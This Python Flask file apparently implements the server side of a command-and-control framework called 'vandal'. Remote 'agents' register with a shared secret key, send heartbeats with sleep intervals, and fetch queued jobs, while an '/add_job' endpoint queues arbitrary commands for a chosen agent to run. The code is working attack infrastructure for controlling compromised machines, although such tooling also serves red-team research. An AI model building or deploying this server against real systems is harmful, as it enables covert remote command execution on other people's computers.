from vandal_settings import PORT, CERT_PATH, KEY_PATH, SECRET_KEY
from flask import Flask, abort, jsonify, render_template, request, json
from pymongo import MongoClient
from kernel.__utilities import *
from kernel.__database import *
import logging,datetime,sys

GLOBAL_SECRET_KEY = SECRET_KEY

# Instantiate the flask backend
app = Flask(__name__)

# Setup logging in case all hell breaks loose
logging.basicConfig(filename='vandal_server.log', level=logging.DEBUG)

# Start server endpoints
@app.route('/listeners', methods=['GET'])
def get_listeners():
    # Fetch all listeners from MongoDB and convert them to a list
    # We set _id = False to exclude the MongoDB ID from the result
    listeners = list(active_listeners.find({}, {'_id': False}))  
    return jsonify({"active_listeners": listeners})

@app.route('/tag', methods=['POST'])
def register():
    if request.headers.get("X-Secret-Key") != GLOBAL_SECRET_KEY:
        return jsonify({"message": "Invalid secret key!"}), 401
    
    agent_data = request.json
    agent_data["agent_id"] = generate_agent_id()
    active_agents.insert_one(agent_data)
    
    return jsonify({"message": "Registered", "agent_id": agent_data["agent_id"]})

@app.route('/beat', methods=['GET'])
def internal_heartbeat():
    received_key = request.headers.get('X-Secret-Key')
    sleep_time = request.headers.get('X-Sleep-Duration')
    print(request.headers)

    print(f"Received sleep_duration: {sleep_time}")

    
    if received_key == GLOBAL_SECRET_KEY:
        # Get agent identifier from the headers
        agent_id = request.headers.get('X-Agent-ID')
        
        # Check if the agent_id is valid (you might want to add more checks here)
        if not agent_id:
            return jsonify({"message": "Agent ID missing or invalid"}), 400
        
        # Get current time
        current_time = datetime.datetime.utcnow()
        formatted_time = current_time.strftime('%H:%M:%S')

        # Update the agent's last check-in time in the MongoDB
        result = active_agents.update_one(
            {"agent_id": agent_id}, 
            {
                "$set": {"sleep_time": sleep_time}
            }
        )

        active_agents.update_one(
            {"agent_id": agent_id}, 
            {
                "$set": {"last_check_in": formatted_time}
            }
        )


        # active_agents.update_one(
        #     {"agent_id": agent_id}, 
        #     {
        #         "$set": {"sleep_time": sleep_time}
        #     }
        # )

        # if result.modified_count == 1:
        #     return jsonify({"message": "[+] Agent checked in"}), 200
        # else:
        #     return jsonify({"message": "Agent ID not found"}), 404


        return jsonify({"message": "[+] Agent checked in"}), 200

    else:
        return "Not Authenticated", 401

@app.route('/job', methods=['GET'])
def tasks():
    return jsonify({"tasks": ["task1", "task2"]})

@app.route('/listener_dashboard', methods=['GET'])
def dashboard():
    return render_template('listener_dashboard.html')

@app.route('/agents', methods=['GET'])
def get_agents():
    all_agents = list(active_agents.find({}, {'_id': False}))
    return jsonify({"registered_agents": all_agents})

@app.route('/jobs/<agent_id>', methods=['GET'])
def get_jobs(agent_id):
    # First we need to clear out any "processing" jobs for this agent
    jobs_collection.delete_many({"agent_id": agent_id, "status": "processing"})

    # Now we can get the next unprocessed job for this agent
    job = jobs_collection.find_one({"agent_id": agent_id, "status": "unprocessed"})
    
    if job:
        # We need to update the job status to "processing"
        jobs_collection.update_one({"_id": job["_id"]}, {"$set": {"status": "processing"}})
        return json.dumps(job, default=json_serial)
    else:
        return jsonify({"message": "No unprocessed job available for this agent"})

@app.route('/add_job', methods=['POST'])
def add_job():
    command = request.json.get('command')
    agent_id = request.json.get('agent_id')
    if not command or not agent_id:
        abort(400, "Please provide both a command and an agent_id")
    job_data = {
        "agent_id": agent_id,
        "command": command,
        "status": "unprocessed"
    }
    jobs_collection.insert_one(job_data)
    return jsonify({"message": ""})


# Eventually the port/debug/ssl context will all be passed via cmd line
# With these being the default values
if __name__ == '__main__':
    app.run(port=PORT, debug=True, ssl_context=(CERT_PATH, KEY_PATH))
